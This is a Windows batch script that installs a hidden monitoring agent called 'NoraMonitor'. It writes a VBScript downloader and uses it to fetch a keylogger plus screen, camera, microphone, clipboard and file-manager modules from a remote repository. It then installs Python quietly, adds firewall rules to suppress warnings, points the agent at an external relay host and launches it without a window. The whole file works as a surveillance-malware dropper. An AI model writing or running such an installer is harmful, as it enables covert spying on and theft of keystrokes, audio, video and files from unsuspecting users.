@echo off
setlocal enabledelayedexpansion

set "DIR=%APPDATA%\NoraMonitor"
set "RAW=https://raw.githubusercontent.com/smallkhk/Nora-signal/claude/legitimate-keylogger-lm3rqu/nora-monitor"

mkdir "%DIR%\templates" 2>nul
mkdir "%DIR%\recordings" 2>nul

:: Download files using VBScript (no PowerShell, binary-safe)
set "DL=%TEMP%\nora_dl.vbs"
echo Dim http, st > "%DL%"
echo Set http = CreateObject("MSXML2.XMLHTTP") >> "%DL%"
echo Set st   = CreateObject("ADODB.Stream")   >> "%DL%"
echo url  = WScript.Arguments(0)               >> "%DL%"
echo dest = WScript.Arguments(1)               >> "%DL%"
echo http.Open "GET", url, False               >> "%DL%"
echo http.Send                                 >> "%DL%"
echo If http.Status = 200 Then                 >> "%DL%"
echo   st.Open : st.Type = 1                   >> "%DL%"
echo   st.Write http.ResponseBody              >> "%DL%"
echo   st.SaveToFile dest, 2                   >> "%DL%"
echo   st.Close                                >> "%DL%"
echo End If                                    >> "%DL%"

for %%F in (app.py keylogger.py screencap.py controller.py server.py recorder.py camera.py clipboard_monitor.py processes.py relay_client.py file_manager.py microphone.py requirements.txt) do (
    cscript //nologo "%DL%" "%RAW%/%%F" "%DIR%\%%F"
)
cscript //nologo "%DL%" "%RAW%/templates/viewer.html" "%DIR%\templates\viewer.html"
del "%DL%"

:: Install Python if missing
python --version >nul 2>&1
if %errorlevel% neq 0 (
    cscript //nologo "%TEMP%\nora_dl.vbs" "https://www.python.org/ftp/python/3.11.9/python-3.11.9-amd64.exe" "%TEMP%\pysetup.exe"
    "%TEMP%\pysetup.exe" /quiet InstallAllUsers=0 PrependPath=1
    timeout /t 20 /nobreak >nul
)

:: Install dependencies
pip install -r "%DIR%\requirements.txt" -q --no-warn-script-location

:: Allow Python through Windows Firewall silently (prevents the popup)
for /f "delims=" %%P in ('where pythonw 2^>nul') do set "PYW=%%P"
if defined PYW (
    netsh advfirewall firewall add rule name="Python Monitor" dir=in action=allow program="%PYW%" enable=yes profile=any >nul 2>&1
    netsh advfirewall firewall add rule name="Python Monitor" dir=out action=allow program="%PYW%" enable=yes profile=any >nul 2>&1
)

:: Launch agent silently
set "NORA_RELAY=https://mon.eclipselivecam.online"
start "" /D "%DIR%" pythonw "%DIR%\app.py"

endlocal
